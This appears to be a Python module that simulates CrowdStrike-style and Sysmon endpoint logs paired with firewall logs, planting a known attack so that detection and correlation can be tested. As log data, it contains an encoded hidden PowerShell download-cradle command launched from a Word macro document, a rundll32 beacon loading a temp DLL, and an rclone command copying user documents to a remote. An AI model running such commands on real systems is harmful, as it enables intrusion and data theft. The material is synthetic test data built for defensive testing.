"""Simulador de logs de endpoint (EDR) EMPAREJADO con el de firewall: las mismas conexiones, vistas desde los equipos, con el proceso
que las abrió. Sirve para probar los detectores de endpoint y, en la entrega D2, la correlación entre fuentes con una verdad conocida.

Qué se planta (en `EndpointTruth`):
* En el equipo de la baliza del firewall, una cadena de ataque: `winword.exe` -> `powershell.exe` (codificado, oculto, sin perfil) ->
  `rundll32.exe`, y es `rundll32.exe` quien abre las conexiones periódicas hacia el destino de la baliza.
* En el equipo de la exfiltración, `rclone.exe` es quien envía los datos.
* El barrido de puertos lo hace `advanced_ip_scanner.exe`; la administración hacia Internet, `mstsc.exe` y `ssh.exe`.
* El reloj del EDR va `clock_skew_s` segundos adelantado respecto al firewall (2,5 s por defecto), como pasa en la realidad.

Formatos (`write_endpoint`): `falcon_csv` (tabla exportada de Event Search / NG-SIEM, con la hora en milisegundos epoch y las rutas
`\\Device\\HarddiskVolume3\\...`) y `sysmon_ecs` (NDJSON de Winlogbeat con nombres ECS, eventos 1 y 3 de Sysmon).
"""
from __future__ import annotations

import csv
import hashlib
import json
import random
from dataclasses import dataclass
from datetime import UTC, timedelta
from pathlib import Path

STYLES = ("falcon_csv", "sysmon_ecs")
_SYS = "C:\\Windows\\System32\\"
_ENC = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


@dataclass(frozen=True)
class EndpointTruth:
    host_of_ip: dict
    beacon_host: str
    beacon_process: str
    beacon_dst: str
    chain: tuple
    exfil_host: str
    exfil_process: str
    clock_skew_s: float
    rows: int


def _sha(name: str) -> str:
    return hashlib.sha256(name.encode()).hexdigest()


def _proc(r: dict, special: dict) -> tuple[str, str, str]:
    """(ejecutable, línea de comandos, padre) del proceso que abrió la conexión `r` del firewall."""
    key = (r["src_ip"], r["dst_ip"])
    if key in special:
        return special[key]
    port = r["dst_port"]
    if port in (53, 123):
        return _SYS + "svchost.exe", "svchost.exe -k NetworkService -p", _SYS + "services.exe"
    if port == 3389:
        return _SYS + "mstsc.exe", "mstsc.exe /v:remoto", _SYS + "explorer.exe"
    if port == 22:
        return _SYS + "OpenSSH\\ssh.exe", "ssh.exe admin@remoto", _SYS + "cmd.exe"
    if port == 445:
        return _SYS + "explorer.exe", "explorer.exe", _SYS + "userinit.exe"
    return ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer",
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe")


def make_endpoint_dataset(fw_rows: list[dict], fw_truth, seed: int = 7, sample: float = 0.25,
                          clock_skew_s: float = 2.5) -> tuple[list[dict], EndpointTruth]:
    """Eventos de endpoint a partir de las filas del firewall (`synthetic_firewall.make_firewall_dataset`) y su verdad."""
    rng = random.Random(seed)
    internal = sorted({r["src_ip"] for r in fw_rows if r["src_ip"].startswith("10.50.1.")}, key=lambda ip: int(ip.split(".")[-1]))
    host_of_ip = {ip: f"WS-{int(ip.split('.')[-1]):03d}" for ip in internal}
    user_of = {}
    for r in fw_rows:
        if r["user"] and r["src_ip"] not in user_of:
            user_of[r["src_ip"]] = r["user"]
    beacon_ip, exfil_ip, scanner_ip = fw_truth.beacon_hosts[0], fw_truth.exfil_hosts[0], fw_truth.scanners[0]
    user_b, user_x = user_of.get(beacon_ip, "ana"), user_of.get(exfil_ip, "luis")
    rundll = (_SYS + "rundll32.exe", f"rundll32.exe C:\\Users\\{user_b}\\AppData\\Local\\Temp\\upd.dll,Start",
              _SYS + "WindowsPowerShell\\v1.0\\powershell.exe")
    rclone = (f"C:\\Users\\{user_x}\\Downloads\\rclone.exe", f"rclone.exe copy C:\\Users\\{user_x}\\Documents remote:bkp --transfers 8",
              _SYS + "cmd.exe")
    special = {(beacon_ip, fw_truth.beacon_dst): rundll, (exfil_ip, fw_truth.exfil_dst): rclone}
    skew = timedelta(seconds=clock_skew_s)
    rows = []

    def event(ts, ip, kind, image, cmd, parent, r=None):
        rows.append({"ts": ts + skew, "host": host_of_ip[ip], "user": user_of.get(ip) or "SYSTEM", "event": kind, "image": image,
                     "cmd": cmd, "parent": parent, "sha256": _sha(image.rsplit("\\", 1)[-1].lower()), "local_ip": ip,
                     "local_port": r["src_port"] if r else None, "remote_ip": r["dst_ip"] if r else None,
                     "remote_port": r["dst_port"] if r else None, "protocol": r["protocol"] if r else None})

    first_beacon = None
    for r in fw_rows:
        ip = r["src_ip"]
        if ip not in host_of_ip or r["protocol"] == "ICMP" or r["dst_port"] is None:
            continue
        planted = (ip, r["dst_ip"]) in special or ip == scanner_ip and r["dst_ip"].startswith("10.50.9.")
        if not planted and (r["action"] != "ALLOW" or rng.random() > sample):
            continue  # el EDR también ve los intentos bloqueados de lo plantado; del resto, una muestra de lo permitido
        if ip == scanner_ip and r["dst_ip"].startswith("10.50.9."):
            image, cmd, parent = (f"C:\\Users\\{user_of.get(ip, 'it')}\\Downloads\\advanced_ip_scanner.exe", "advanced_ip_scanner.exe",
                                  _SYS + "explorer.exe")
        else:
            image, cmd, parent = _proc(r, special)
        if (ip, r["dst_ip"]) == (beacon_ip, fw_truth.beacon_dst) and first_beacon is None:
            first_beacon = r["ts"]
        event(r["ts"], ip, "network", image, cmd, parent, r)
    if first_beacon is not None:  # la cadena que precede a la baliza: Word -> PowerShell codificado -> rundll32
        office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
        event(first_beacon - timedelta(minutes=3), beacon_ip, "process", office, f"WINWORD.EXE /n C:\\Users\\{user_b}\\Downloads\\factura.docm",
              _SYS + "explorer.exe")
        event(first_beacon - timedelta(minutes=2), beacon_ip, "process", _SYS + "WindowsPowerShell\\v1.0\\powershell.exe",
              f"powershell.exe -nop -w hidden -enc {_ENC}", office)
        event(first_beacon - timedelta(minutes=1), beacon_ip, "process", *rundll)
    rows.sort(key=lambda e: (e["ts"], e["host"], e["event"], e["remote_ip"] or ""))
    truth = EndpointTruth(host_of_ip=host_of_ip, beacon_host=host_of_ip[beacon_ip], beacon_process="rundll32.exe",
                          beacon_dst=fw_truth.beacon_dst, chain=("winword.exe", "powershell.exe"), exfil_host=host_of_ip[exfil_ip],
                          exfil_process="rclone.exe", clock_skew_s=clock_skew_s, rows=len(rows))
    return rows, truth


_PROTO = {"TCP": "6", "UDP": "17"}


def _falcon_path(windows_path: str) -> str:
    return "\\Device\\HarddiskVolume3" + windows_path[2:] if windows_path[1:3] == ":\\" else windows_path


def write_endpoint(rows: list[dict], path: str | Path, style: str = "falcon_csv") -> Path:
    if style not in STYLES:
        raise ValueError(f"Formato desconocido: {style!r} (válidos: {STYLES})")
    path = Path(path)
    if style == "falcon_csv":
        with path.open("w", newline="", encoding="utf-8") as fh:
            w = csv.writer(fh)
            w.writerow(["timestamp", "ComputerName", "UserName", "event_simpleName", "ImageFileName", "CommandLine", "ParentBaseFileName",
                        "SHA256HashData", "LocalAddressIP4", "LocalPort", "RemoteAddressIP4", "RemotePort", "Protocol"])
            for e in rows:
                net = e["event"] == "network"
                w.writerow([int(e["ts"].replace(tzinfo=UTC).timestamp() * 1000), e["host"], e["user"],
                            "NetworkConnectIP4" if net else "ProcessRollup2", _falcon_path(e["image"]), e["cmd"],
                            e["parent"].rsplit("\\", 1)[-1], e["sha256"], e["local_ip"], e["local_port"] if net else "",
                            e["remote_ip"] or "", e["remote_port"] if net else "", _PROTO.get(e["protocol"], "") if net else ""])
        return path
    with path.open("w", encoding="utf-8") as fh:
        for e in rows:
            net = e["event"] == "network"
            doc = {"@timestamp": e["ts"].strftime("%Y-%m-%dT%H:%M:%S.000Z"), "host": {"name": e["host"]}, "user": {"name": e["user"]},
                   "event": {"code": "3" if net else "1"},
                   "process": {"executable": e["image"], "command_line": e["cmd"], "parent": {"executable": e["parent"]},
                               "hash": {"sha256": e["sha256"]}},
                   "source": {"ip": e["local_ip"], **({"port": e["local_port"]} if net else {})}}
            if net:
                doc["destination"] = {"ip": e["remote_ip"], "port": e["remote_port"]}
                doc["network"] = {"transport": e["protocol"].lower()}
            fh.write(json.dumps(doc) + "\n")
    return path
